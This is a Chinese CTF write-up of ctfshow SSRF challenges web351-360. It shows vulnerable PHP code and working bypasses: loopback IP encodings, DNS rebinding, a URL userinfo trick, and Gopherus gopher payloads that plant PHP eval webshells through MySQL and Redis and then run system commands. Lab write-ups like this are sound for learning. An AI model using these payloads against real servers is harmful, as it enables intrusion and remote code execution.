---
title: Web入门_SSRF
author: Creexile
date: 2024-12-02 21:17:45
lastMod: 2025-08-29
summary: 'web351-360'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [SSRF, 代码审计, DNS重定向, 文件包含, 伪协议, CTF]
---

# Web入门\_SSRF

---

web351-360

先介绍一下SSRF: 是一种由攻击者发起的伪造服务器发送的请求的一种攻击; 也就是被攻击者会认为攻击来源是内网服务器甚至本机

## web351

- 描述: SSRF开始啦

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

构造自己访问自己的payload即可

```
POST:
url=file:///var/www/html/flag.php
# 或者
url=127.0.0.1/flag.php
```

## web352

- 描述: SSRF开始啦

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
    if(!preg_match('/localhost|127.0.0/')){
        $ch=curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1) ;
        $result=curl_exec($ch);
        curl_close($ch);
        echo ($result);
    }
    else{
        die('hacker');
    }
}
else{
    die('hacker');
}
?>
```

限定了传入的字符开头必须是http或者https, `preg_match`函数的参数都没给完整可以直接无视, poc如下:

```bash
POST:
# 直接用
url=http://127.0.0.1/flag.php
url=http://localhost/flag.php
# 16进制
url=http://0x7F000001/flag.php
# 8进制
url=http://0177.0000.0000.0001/flag.php
# 10进制(长整型IP) ((127*256+0)*256+0)*256+1
url=http://2130706433/flag.php
# 其他, 反正能指向本地就行
url=http://127.00000.00000.00001/flag.php
```

## web353

- 描述: 同上

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
    if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
        $ch=curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result=curl_exec($ch);
        curl_close($ch);
        echo ($result);
    }
    else{
        die('hacker');
    }
}
else{
    die('hacker');
}
?>
```

真过滤啦?去上一题拿一个poc就行了

## web354

- 描述: 同上

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
    if(!preg_match('/localhost|1|0|。/i', $url)){
        $ch=curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result=curl_exec($ch);
        curl_close($ch);
        echo ($result);
    }
    else{
        die('hacker');
    }
}
else{
    die('hacker');
}
?>
```

和web352思路类似, 过滤0和1换进制的方法都挂了, 那就用能指向或跳转到本地的url即可; 检查的方法就是找个域名解析网址(nslookup也行), 解析出来A记录还是什么应该有127.0.0.1

```
POST:
# 找到的指向127.0.0.1的网站
url=http://safe.taobao.com/flag.php
url=http://spoofed.burpcollaborator.net/flag.php
url=http://sudo.cc/flag.php
url=http://www.ruiaxx.cn/flag.php
```

## web355

- 描述: 同上

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
    $host=$x['host'];
    if((strlen($host)<=5)){
        $ch=curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result=curl_exec($ch);
        curl_close($ch);
        echo ($result);
    }
    else{
        die('hacker');
    }
}
else{
    die('hacker');
}
?>
```

限制长度为5?完整的url肯定是输入不了了, 再找找有什么能指向127.0.0.1的异形url吧

```
POST:
url=http://0/flag.php
url=http://127.1/flag.php
```

## web356

- 描述: 同上

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
    $host=$x['host'];
    if((strlen($host)<=3)){
        $ch=curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result=curl_exec($ch);
        curl_close($ch);
        echo ($result);
    }
    else{
        die('hacker');
    }
}
else{
    die('hacker');
}
?>
```

这下小于等于3, 掏出上一题的`url=http://0/flag.php`即可

## web357

- 描述: 同上

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
    $ip = gethostbyname($x['host']);
    echo '</br>'.$ip.'</br>';
    if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        die('ip!');
    }
    echo file_get_contents($_POST['url']);
}
else{
    die('scheme');
}
?>
```

`gethostbyname` -- 返回主机名对应的IPv4地址
`filter_var` -- 使用特定的过滤器过滤一个变量
`FILTER_VALIDATE_IP` -- 验证是否为有效的IP地址
`FILTER_FLAG_NO_PRIV_RANGE` -- 排除私有IP地址
`FILTER_FLAG_NO_RES_RANGE` -- 排除保留IP地址, 如回环地址127.0.0.1

这个程序检查获取到的IP地址是否是一个有效的公共IP地址; 而且这个是解析过后的, 就算传入`http://127.1/flag.php`, 输出的和判断的依然是127.0.0.1, 不给通过

这里用到了DNS Rebinding攻击(DNS重绑定/重定向攻击), [浅析DNS Rebinding](https://zhuanlan.zhihu.com/p/621520621);

> 在题目代码中一共对域名进行了两次请求, 第一次是`gethostbyname`方法, 第二次则是 `file_get_contents`文件读取, 可以通过 DNS重绑定来实现攻击

在该网址: [CEYE-dns重定向](http://ceye.io/profile)可以找到漏洞介绍, 使用教程和相关工具

注意是在Profile界面`+ New DNS`, 新增127.0.0.1后再新增一个任意ip, 如图所示

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024175815.png)

```
http://r.xxxxxx.ceye.io/flag.txt
# 把你自己的Identifier填进去
```

会有几率第一次解析到127.0.0.1, 多试几次

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024180242.png)

## web358

- 描述: 同上

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

要求url中必须有`http`, `ctf.`以及必须以`show`结尾, 让ctf.被视为url构成中的username即可

```
POST:
url=http://ctf.@127.0.0.1/flag.php?show
url=http://ctf.:passwd@127.0.0.1/flag.php#show
```

## web359-web360

- 描述: 打无密码的mysql

抓包发现有可传参的`returl`参数

利用gopher协议和mysql数据库攻击, 现成的工具(必须没有密码): [Gopherus](https://github.com/tarunkant/Gopherus)

```bash
python2 .\gopherus.py --exploit mysql
root
select '<?=eval($_POST[1])?>' into outfile '/var/www/html/1.php';

# gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%42%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%3d%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%3b%01%00%00%00%01
```

需要手动将`gopher://127.0.0.1:3306/_`后的内容再进行url编码一次, 我也不知道为什么, 反正编码了之后才能用

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024193221.png)

然后用啥玩意执行命令就行, flag在根目录下, payload如下

```
1=system('tac /flag.txt');
```

然后360基本一样, 将mysql改成redis即可, 也是需要再次URL编码

```bash
python2 .\gopherus.py --exploit redis
PHPShell
<?php eval($_POST[1]);?>
```

相关文件:

- [[../../../ctf/ctf基础/文件包含]]
- [[Web入门_代码审计]]web359 -> web308
